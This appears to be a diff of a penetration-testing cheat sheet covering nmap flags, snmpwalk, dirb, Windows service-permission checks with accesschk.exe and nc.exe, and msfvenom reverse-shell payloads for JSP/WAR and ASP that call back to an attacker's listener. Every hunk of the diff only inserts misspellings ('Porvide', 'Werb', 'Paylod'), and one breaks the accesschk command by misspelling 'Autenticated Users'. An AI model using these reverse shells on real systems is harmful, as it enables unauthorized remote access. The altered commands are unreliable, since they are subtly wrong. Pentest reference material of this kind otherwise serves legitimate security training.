@@ -206,7 +206,7 @@ Hit Return 2x
 
 <code>-T[1-5]</code>: Speed of Scan (5 Being the Fastest)
 
-<code>-p [PORT(S)]</code>: Specify Port, or Provide Comma Separated List of Ports
+<code>-p [PORT(S)]</code>: Specify Port, or Porvide Comma Seperated List of Ports
 
 <code>-p-</code>: Full Port Scan
 
@@ -274,7 +274,7 @@ TCP Local Ports: <code>1.3.6.1.2.1.6.13.1.3</code>
 
 <code>snmpwalk -c [COMMNITY_STRING] -v[SNMP_VERSION] [IP] [MIB_VALUE]</code> 
 
-## Web Servers
+## Werb Servers
 
 <code>dirb [URL]</code>
 
@@ -505,7 +505,7 @@ Run the exploit on the target host.
 
 Upload <code>accesschk.exe</code> and <code>nc.exe</code> to the target host.
 
-<code>accesschk.exe /accepteula -uwcqv "Authenticated Users" *</code>
+<code>accesschk.exe /accepteula -uwcqv "Autenticated Users" *</code>
 
 Running the following gives more information about the specified service (i.e. what groups have what permissions over it).
 
@@ -563,7 +563,7 @@ Append <code><?php</code>
 
 <code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=[LOCAL_IP] LPORT=[PORT] -f war > shell.war</code>
 
-### ASP Payload: 
+### ASP Paylod: 
 
 <code>msfvenom -p windows/shell_reverse_tcp LHOST=[LOCAL_IP] LPORT=[PORT] -f asp > shell.asp</code>
 
